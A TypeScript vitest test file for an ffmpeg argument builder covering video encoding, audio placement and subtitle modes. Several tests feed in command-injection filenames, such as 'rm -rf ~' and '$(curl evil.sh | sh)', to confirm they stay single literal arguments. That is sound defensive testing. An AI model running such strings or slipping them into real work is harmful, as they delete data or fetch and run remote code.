import { describe, expect, it } from "vitest";
import { buildComposeArgv } from "../../../src/adapters/compose/compose-argv.js";
import type { ComposeParams } from "../../../src/domain/ports/platform-profile.js";

const baseParams: ComposeParams = {
  rawClip: { path: "clip.mp4", durationMs: 1000, aspectRatio: "16:9", scenes: [], preRollMs: 0 },
  audioTracks: [{ segmentId: "seg-1", path: "seg-1.mp3", durationMs: 1000 }],
  subtitles: [{ text: "Let's log in.", startMs: 0, durationMs: 1000 }],
  outputPath: "final.mp4",
};

const professionalH264Settings = [
  "-c:v", "libx264",
  "-crf", "18",
  "-preset", "slow",
  "-pix_fmt", "yuv420p",
  "-movflags", "+faststart",
  "-color_range", "tv",
  "-colorspace", "bt709",
  "-color_primaries", "bt709",
  "-color_trc", "bt709",
];

describe("buildComposeArgv — argv-array process boundary safety", () => {
  it("uses the professional H.264 delivery settings for the default export", () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "final.mp4");

    expect(argv).toEqual(expect.arrayContaining(professionalH264Settings));
  });

  it("passes filenames with shell metacharacters through as literal single argv items", () => {
    const malicious = "clip.mp4; rm -rf ~ | $(touch pwned) `touch pwned2` and spaces.mp4";
    const params: ComposeParams = {
      ...baseParams,
      rawClip: { ...baseParams.rawClip, path: malicious },
    };
    const argv = buildComposeArgv(params, "subs.srt", "out.mp4");

    // The malicious string must appear as EXACTLY ONE array element, byte-for-byte, never split
    // on whitespace/metacharacters (which would happen if this were ever shell-interpolated).
    expect(argv).toContain(malicious);
    expect(argv.filter((arg) => arg === malicious)).toHaveLength(1);
    // No shell metacharacter token leaked out into a separate argv slot (would prove splitting).
    expect(argv).not.toContain("rm");
    expect(argv).not.toContain("-rf");
    expect(argv).not.toContain("touch");
  });

  it("passes audio and output paths containing shell metacharacters through as literal single argv items", () => {
    const maliciousAudio = "$(curl evil.sh | sh).mp3";
    const maliciousOutput = "out `id`.mp4";
    const params: ComposeParams = {
      ...baseParams,
      audioTracks: [{ segmentId: "seg-1", path: maliciousAudio, durationMs: 1000 }],
    };
    const argv = buildComposeArgv(params, "subs.srt", maliciousOutput);

    expect(argv).toContain(maliciousAudio);
    expect(argv.at(-1)).toBe(maliciousOutput);
  });

  it("neutralizes a leading-dash output filename so it cannot be parsed as an ffmpeg flag", () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "-oevil.mp4");

    // Never emit a bare leading-dash positional path: ffmpeg's own argv parser could otherwise
    // treat it as an unrecognized option instead of a filename.
    expect(argv).not.toContain("-oevil.mp4");
    expect(argv.at(-1)).toBe("./-oevil.mp4");
  });

  it("neutralizes a leading-dash input path (raw clip, audio, subtitles) the same way", () => {
    const params: ComposeParams = {
      ...baseParams,
      rawClip: { ...baseParams.rawClip, path: "-x.mp4" },
      audioTracks: [{ segmentId: "seg-1", path: "-y.mp3", durationMs: 1000 }],
    };
    const argv = buildComposeArgv(params, "-subs.srt", "out.mp4");

    expect(argv).not.toContain("-x.mp4");
    expect(argv).not.toContain("-y.mp3");
    expect(argv).not.toContain("-subs.srt");
    expect(argv).toContain("./-x.mp4");
    expect(argv).toContain("./-y.mp3");
    expect(argv).toContain("./-subs.srt");
  });

  it("builds correct argv for a single-track YouTube 16:9 compose", () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "final.mp4");

    expect(argv).toEqual([
      "-y",
      "-i",
      "clip.mp4",
      "-i",
      "seg-1.mp3",
      "-i",
      "subs.srt",
      "-filter_complex",
      "[1:a]concat=n=1:v=0:a=1[aout]",
      "-map",
      "0:v",
      "-map",
      "[aout]",
      "-map",
      "2:s",
      "-c:v",
      "libx264",
      "-crf",
      "18",
      "-preset",
      "slow",
      "-pix_fmt",
      "yuv420p",
      "-movflags",
      "+faststart",
      "-color_range",
      "tv",
      "-colorspace",
      "bt709",
      "-color_primaries",
      "bt709",
      "-color_trc",
      "bt709",
      "-c:a",
      "aac",
      "-c:s",
      "mov_text",
      "-shortest",
      "final.mp4",
    ]);
  });

  it("builds correct argv for a multi-track compose, concatenating audio inputs in order", () => {
    const params: ComposeParams = {
      ...baseParams,
      audioTracks: [
        { segmentId: "seg-1", path: "seg-1.mp3", durationMs: 1000 },
        { segmentId: "seg-2", path: "seg-2.mp3", durationMs: 1500 },
      ],
    };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");

    expect(argv).toEqual([
      "-y",
      "-i",
      "clip.mp4",
      "-i",
      "seg-1.mp3",
      "-i",
      "seg-2.mp3",
      "-i",
      "subs.srt",
      "-filter_complex",
      "[1:a][2:a]concat=n=2:v=0:a=1[aout]",
      "-map",
      "0:v",
      "-map",
      "[aout]",
      "-map",
      "3:s",
      "-c:v",
      "libx264",
      "-crf",
      "18",
      "-preset",
      "slow",
      "-pix_fmt",
      "yuv420p",
      "-movflags",
      "+faststart",
      "-color_range",
      "tv",
      "-colorspace",
      "bt709",
      "-color_primaries",
      "bt709",
      "-color_trc",
      "bt709",
      "-c:a",
      "aac",
      "-c:s",
      "mov_text",
      "-shortest",
      "final.mp4",
    ]);
  });

  it('defaults narration to "both" when unset (existing single-track behavior unchanged)', () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "final.mp4");
    expect(argv).toContain("mov_text");
    expect(argv).toContain("aac");
  });
});

describe("buildComposeArgv — audio placement at overlap-adjusted (xfade) scene starts", () => {
  it("keeps the legacy concat filter when rawClip.scenes is empty (no timing info to compare against)", () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "final.mp4");
    expect(argv).toContain("[1:a]concat=n=1:v=0:a=1[aout]");
  });

  it("keeps the legacy concat filter when scenes are present but contiguous (dip mode, no overlap)", () => {
    const params: ComposeParams = {
      ...baseParams,
      rawClip: {
        ...baseParams.rawClip,
        scenes: [{ narrationSegmentId: "seg-1", startMs: 0, endMs: 1000 }],
      },
    };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");
    expect(argv).toContain("[1:a]concat=n=1:v=0:a=1[aout]");
  });

  it("switches to per-track adelay + amix when a scene's real startMs overlaps the naive cumulative-duration sum (xfade mode)", () => {
    const params: ComposeParams = {
      ...baseParams,
      rawClip: {
        ...baseParams.rawClip,
        scenes: [
          { narrationSegmentId: "seg-1", startMs: 0, endMs: 1000 },
          { narrationSegmentId: "seg-2", startMs: 750, endMs: 1550 },
        ],
      },
      audioTracks: [
        { segmentId: "seg-1", path: "seg-1.mp3", durationMs: 1000 },
        { segmentId: "seg-2", path: "seg-2.mp3", durationMs: 800 },
      ],
    };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");
    const filterComplex = argv[argv.indexOf("-filter_complex") + 1] as string;

    expect(filterComplex).toBe(
      "[1:a]anull[a0];[2:a]adelay=750:all=1[a1];[a0][a1]amix=inputs=2:duration=longest:normalize=0[aout]",
    );
    expect(argv.join(" ")).not.toMatch(/concat=n=\d+:v=0:a=1/);
  });

  it('applies the same overlap-adjusted placement in narration mode "voice" (audio muxed, no subtitle stream)', () => {
    const params: ComposeParams = {
      ...baseParams,
      narration: "voice",
      rawClip: {
        ...baseParams.rawClip,
        scenes: [
          { narrationSegmentId: "seg-1", startMs: 0, endMs: 1000 },
          { narrationSegmentId: "seg-2", startMs: 750, endMs: 1550 },
        ],
      },
      audioTracks: [
        { segmentId: "seg-1", path: "seg-1.mp3", durationMs: 1000 },
        { segmentId: "seg-2", path: "seg-2.mp3", durationMs: 800 },
      ],
    };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");
    const filterComplex = argv[argv.indexOf("-filter_complex") + 1] as string;

    expect(filterComplex).toBe(
      "[1:a]anull[a0];[2:a]adelay=750:all=1[a1];[a0][a1]amix=inputs=2:duration=longest:normalize=0[aout]",
    );
    expect(argv).not.toContain("subs.srt");
  });
});

describe('buildComposeArgv — narration mode "voice" (audio, no subtitles)', () => {
  it("mixes audio but attaches no subtitle stream at all", () => {
    const params: ComposeParams = { ...baseParams, narration: "voice" };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");

    expect(argv).toEqual([
      "-y",
      "-i",
      "clip.mp4",
      "-i",
      "seg-1.mp3",
      "-filter_complex",
      "[1:a]concat=n=1:v=0:a=1[aout]",
      "-map",
      "0:v",
      "-map",
      "[aout]",
      "-c:v",
      "libx264",
      "-crf",
      "18",
      "-preset",
      "slow",
      "-pix_fmt",
      "yuv420p",
      "-movflags",
      "+faststart",
      "-color_range",
      "tv",
      "-colorspace",
      "bt709",
      "-color_primaries",
      "bt709",
      "-color_trc",
      "bt709",
      "-c:a",
      "aac",
      "-shortest",
      "final.mp4",
    ]);
    expect(argv).not.toContain("subs.srt");
    expect(argv).not.toContain("mov_text");
  });
});

describe('buildComposeArgv — narration mode "subtitles" (silent, burned-in captions)', () => {
  it("produces a silent video (no audio input, no -c:a, -an) with burned-in subtitles", () => {
    const params: ComposeParams = { ...baseParams, narration: "subtitles", audioTracks: [] };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");

    expect(argv).toEqual([
      "-y",
      "-i",
      "clip.mp4",
      "-vf",
      "subtitles='subs.srt'",
      "-map",
      "0:v",
      "-c:v",
      "libx264",
      "-crf",
      "18",
      "-preset",
      "slow",
      "-pix_fmt",
      "yuv420p",
      "-movflags",
      "+faststart",
      "-color_range",
      "tv",
      "-colorspace",
      "bt709",
      "-color_primaries",
      "bt709",
      "-color_trc",
      "bt709",
      "-an",
      "final.mp4",
    ]);
  });

  it("does not error or emit an audio concat filter when audioTracks is empty", () => {
    const params: ComposeParams = { ...baseParams, narration: "subtitles", audioTracks: [] };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");

    expect(argv.join(" ")).not.toMatch(/concat/);
    expect(argv).not.toContain("-c:a");
    expect(argv).not.toContain("aac");
    expect(argv).toContain("-an");
  });

  it("escapes ffmpeg subtitles-filter metacharacters (colon, backslash, quote) in the SRT path as one argv item", () => {
    const trickyPath = "C:\\Users\\a b\\weird'name.srt";
    const params: ComposeParams = { ...baseParams, narration: "subtitles", audioTracks: [] };
    const argv = buildComposeArgv(params, trickyPath, "final.mp4");

    const vfIndex = argv.indexOf("-vf");
    expect(vfIndex).toBeGreaterThanOrEqual(0);
    const vfValue = argv[vfIndex + 1] as string;
    // Exactly one argv element carries the whole filter — never split by whitespace/metachars.
    expect(argv.filter((arg) => arg?.startsWith("subtitles=")).length).toBe(1);
    // The raw unescaped colon-drive-letter form must not appear verbatim (would break ffmpeg's
    // own filter-option parser, which reads bare ':' as an option separator).
    expect(vfValue).not.toContain("C:\\Users");
    expect(vfValue).toContain("subtitles=");
  });

  it("neutralizes a leading-dash raw clip / output path the same way as other narration modes", () => {
    const params: ComposeParams = {
      ...baseParams,
      narration: "subtitles",
      audioTracks: [],
      rawClip: { ...baseParams.rawClip, path: "-x.mp4" },
    };
    const argv = buildComposeArgv(params, "subs.srt", "-oevil.mp4");

    expect(argv).not.toContain("-x.mp4");
    expect(argv).not.toContain("-oevil.mp4");
    expect(argv).toContain("./-x.mp4");
    expect(argv.at(-1)).toBe("./-oevil.mp4");
  });

  it("passes a malicious rawClip path through as one literal argv item (never shell-interpolated)", () => {
    const malicious = "clip.mp4; rm -rf ~ | $(touch pwned).mp4";
    const params: ComposeParams = {
      ...baseParams,
      narration: "subtitles",
      audioTracks: [],
      rawClip: { ...baseParams.rawClip, path: malicious },
    };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");

    expect(argv).toContain(malicious);
    expect(argv.filter((arg) => arg === malicious)).toHaveLength(1);
    expect(argv).not.toContain("rm");
  });
});
